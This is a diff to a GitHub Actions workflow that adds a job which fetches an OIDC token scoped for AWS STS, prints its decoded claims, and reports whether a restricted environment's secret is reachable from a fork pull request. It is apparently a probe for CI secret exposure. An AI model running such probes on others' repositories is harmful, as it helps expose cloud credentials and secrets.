@@ -35,3 +35,26 @@ jobs:
           name: workflow-run-restricted-env-oidc
           path: /tmp/oidc_token.txt
           retention-days: 1
+
+  test-custom-policy:
+    runs-on: ubuntu-latest
+    environment: restricted-custom
+    steps:
+      - name: Capture OIDC for custom_branch_policies env
+        run: |
+          FULL_JWT=$(curl -sS \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
+          echo "=== custom_branch_policies env OIDC ==="
+          echo "$PAYLOAD" | python3 -c "
+          import sys, base64, json
+          d = sys.stdin.read().strip()
+          p = d + chr(61) * (4 - len(d) % 4)
+          j = json.loads(base64.urlsafe_b64decode(p))
+          print(json.dumps(j, indent=2))"
+      - name: Check custom policy secret
+        run: |
+          if [ -n "$CUSTOM_POLICY_SECRET" ]; then echo "CUSTOM POLICY SECRET ACCESSIBLE VIA FORK PR!"; else echo "CUSTOM POLICY SECRET BLOCKED"; fi
+        env:
+          CUSTOM_POLICY_SECRET: ${{ secrets.CUSTOM_POLICY_SECRET }}
